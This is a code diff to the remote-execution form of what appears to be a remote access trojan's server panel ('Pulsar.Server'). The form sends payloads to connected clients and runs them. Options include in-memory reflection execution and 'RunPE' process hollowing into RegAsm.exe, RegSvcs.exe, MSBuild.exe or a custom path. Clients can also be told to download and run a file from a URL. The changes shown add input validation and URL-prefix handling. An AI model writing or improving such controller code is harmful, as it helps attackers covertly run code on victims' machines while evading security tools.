@@ -123,6 +123,7 @@ namespace Pulsar.Server.Forms
             _executeInMemoryDotNet = chkBoxReflectionExecute.Checked;
             _useRunPE = chkRunPE.Checked;
 
+            // Check RunPE target selection
             if (_useRunPE)
             {
                 switch (cmbRunPETarget.SelectedIndex)
@@ -130,7 +131,7 @@ namespace Pulsar.Server.Forms
                     case 0: _runPETarget = "a"; break; // RegAsm.exe
                     case 1: _runPETarget = "b"; break; // RegSvcs.exe
                     case 2: _runPETarget = "c"; break; // MSBuild.exe
-                    case 3: 
+                    case 3:
                         _runPETarget = "d"; // Custom Path
                         _runPECustomPath = txtRunPECustomPath.Text;
                         if (string.IsNullOrWhiteSpace(_runPECustomPath))
@@ -143,11 +144,21 @@ namespace Pulsar.Server.Forms
                 }
             }
 
+            // Validate file type if RunPE or Reflection Execute is selected
+            if ((_useRunPE || _executeInMemoryDotNet) && !radioURL.Checked)
+            {
+                if (!txtPath.Text.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
+                {
+                    MessageBox.Show("RunPE or Reflection Execute can only run .exe files.", "Invalid File Type", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+            }
+
             if (radioURL.Checked)
             {
                 foreach (var handler in _remoteExecutionMessageHandlers)
                 {
-                    if (!txtURL.Text.StartsWith("http"))
+                    if (!txtURL.Text.StartsWith("http", StringComparison.OrdinalIgnoreCase))
                         txtURL.Text = "http://" + txtURL.Text;
 
                     handler.TaskHandler.StartProcessFromWeb(txtURL.Text, _isUpdate, _executeInMemoryDotNet, _useRunPE, _runPETarget, _runPECustomPath);
